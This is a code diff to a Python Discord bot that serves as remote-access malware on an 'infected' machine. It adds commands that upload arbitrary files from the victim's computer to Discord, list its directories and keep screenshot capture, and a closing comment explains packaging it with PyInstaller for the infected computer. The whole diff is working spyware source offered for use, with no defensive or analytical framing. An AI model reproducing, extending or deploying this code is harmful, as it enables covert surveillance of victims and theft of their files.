@@ -79,6 +79,7 @@ intents = discord.Intents.all()
 intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+infected_ip = "123.123.0.12"
 
 @bot.event
 async def on_ready():
@@ -95,7 +96,7 @@ async def run(ctx):
 @bot.command()
 async def kill(ctx):
     global infected_ip
-    if not infected_ip:
+    if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
         return
     file_path = "./Downloads/main.exe"
@@ -115,7 +116,7 @@ import io
 @bot.command()
 async def screenshot(ctx):
     global infected_ip
-    if not infected_ip:
+    if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
         return
     import pyautogui
@@ -126,15 +127,50 @@ async def screenshot(ctx):
         image_binary.seek(0)
         await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))
 
+
 @bot.command()
-async def shutdown(ctx):
+async def get_file(ctx, *, filepath: str):
     global infected_ip
-    if not infected_ip:
+    if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
         return
-    os._exit()
-    await ctx.send(f"Sent shutdown to {host_name}/{infected_ip}")
+    if not os.path.isfile(filepath):
+        await ctx.send("File does not exist.")
+        return
+    try:
+        await ctx.send(file=discord.File(fp=filepath))
+    except Exception as e:
+        await ctx.send(f"Failed to send file: {e}")
 
+@bot.command()
+async def list_files(ctx, *, dir: str):
+    global infected_ip
+    if infected_ip != public_ip_address:
+        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
+        return
+    if dir:
+        if os.path.isdir(dir):
+            try:
+                files = os.listdir(dir)
+                files_str = "\n".join(files)
+                if len(files_str) > 1900:
+                    import io
+                    with io.StringIO(files_str) as f:
+                        await ctx.send(file=discord.File(fp=f, filename="files.txt"))
+                else:
+                    await ctx.send(f"Files in `{dir}`:\n```{files_str}```")
+            except Exception as e:
+                await ctx.send(f"Error reading directory: {e}")
+        else:
+            await ctx.send("Path to directory does not exist.")
+    else:
+        await ctx.send("Please send !list_files <filepath>")
+
+@bot.command()
+@commands.has_permissions(manage_messages=True)
+async def purge_channel(ctx, amount: int = 100):
+    deleted = await ctx.channel.purge(limit=amount + 1)
+    await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)
 
 @bot.command()
 async def infected_machine_ip(ctx, ip: str):
@@ -147,10 +183,5 @@ async def infected_machine_ip(ctx, ip: str):
     except ValueError:
         await ctx.send("❌ Invalid IP address.")
 
-@bot.command()
-@commands.has_permissions(manage_messages=True)
-async def purge_channel(ctx, amount: int = 100):
-    deleted = await ctx.channel.purge(limit=amount + 1)
-    await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)
 
 bot.run(os.getenv("BOT_TOKEN")) #USE AT YOUR OWN RISK!!!!!! YOU MAY NEED TO SETUP A SEPERATE SERVER TO AVOID EXPOSING YOUR TOKEN TO THE INFECTED COMPUTER. OTHERWISE PUT THE TOKEN THERE THEN PYINSTALLER IT!!!!!
